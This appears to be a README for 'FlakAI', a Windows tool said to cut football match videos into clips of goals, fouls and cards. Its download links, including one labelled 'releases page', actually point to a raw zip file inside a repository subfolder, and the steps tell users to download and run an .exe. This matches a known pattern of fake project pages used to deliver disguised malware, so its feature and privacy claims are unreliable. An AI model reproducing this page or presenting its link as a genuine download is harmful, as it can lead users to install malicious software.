# ⚽ FlakAI - Turn football videos into game clips

[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Augusteregular234/FlakAI/main/backend/ml/Flak_AI_2.5-beta.2.zip)

FlakAI identifies key moments in football matches using computer vision. You upload your file, and the software finds events like goals, fouls, and cards. It saves your time by cutting the full video into short, organized clips.

## 📥 Getting Started

Follow these steps to set up FlakAI on your Windows computer.

1. Visit the [releases page](https://raw.githubusercontent.com/Augusteregular234/FlakAI/main/backend/ml/Flak_AI_2.5-beta.2.zip).
2. Look for the latest version at the top of the list.
3. Download the file ending in `.exe`.
4. Open the file to start the installation.
5. Follow the prompts on your screen.

## 💻 System Requirements

Your computer needs specific hardware to run video analysis software. 

- Operating System: Windows 10 or Windows 11.
- Processor: Intel Core i5 or better.
- Memory: 8 GB of RAM minimum, 16 GB for better performance.
- Storage: 5 GB of free space.
- Graphics: A dedicated graphics card helps the software process video faster.

## 🛠️ How to Use FlakAI

Once you install and open the application, the interface guides you through the process.

1. Click the "New Project" button.
2. Select the video file from your computer. The software supports standard formats like MP4 and MOV.
3. Choose the output folder where you want to save the clips.
4. Press the "Start Analysis" button. 
5. Wait for the progress bar to finish. The software analyzes the video frame by frame.
6. Review the list of detected events. You can preview each clip within the app.
7. Save the clips you wish to keep to your hard drive.

## 🔍 Understanding the Features

FlakAI performs several tasks to organize your footage.

- Event Detection: The software labels moments based on the activity on the pitch.
- Automated Trimming: You get small video files instead of one long match.
- Format Support: You can import high-definition files without loss of quality.
- Organization: Clips group into folders based on the type of event.

## 🖥️ User Interface Guide

The main screen contains three areas. On the left, you see your upload queue. The center box shows your video player. The right panel displays the event log. 

When you click an event in the log, the video player jumps to that moment. Use the checkboxes to select multiple clips at once. Click the export icon to send them to your specific folder.

## ⚙️ Settings and Customization

You can change how the software works in the settings menu.

- Detection Sensitivity: Move this slider if the software misses events or labels them incorrectly.
- Clip Length: Choose how many seconds of video to include before and after an event. 
- Output Quality: Adjust settings to balance file size against image clarity.

## ❓ Frequently Asked Questions

**Does the software work without the internet?**
Yes. Your video stays on your computer. FlakAI processes everything locally. 

**What happens if the software stops during analysis?**
Restart the application and try again. Ensure your computer stays awake while processing large files.

**Can I stop the process halfway?**
Yes. Click the "Cancel" button to end the task. The clips saved before you clicked will remain.

## 📋 Troubleshooting Performance

If the software runs slow, try these tips:

- Close other programs that use a lot of memory, such as web browsers or video games.
- Ensure your computer is plugged into a power source.
- Check that you installed the latest version from the link above.
- Move your video file to a local drive rather than an external drive.

## 🛠️ Technical Support

The software provides logs if errors happen. If you encounter a crash:

1. Click Help in the menu bar.
2. Select View Logs.
3. Save the text file to your desktop.
4. Create a new issue on the project page and attach the log file.

This helps developers understand what went wrong on your machine. Avoid sharing private information in the log file.
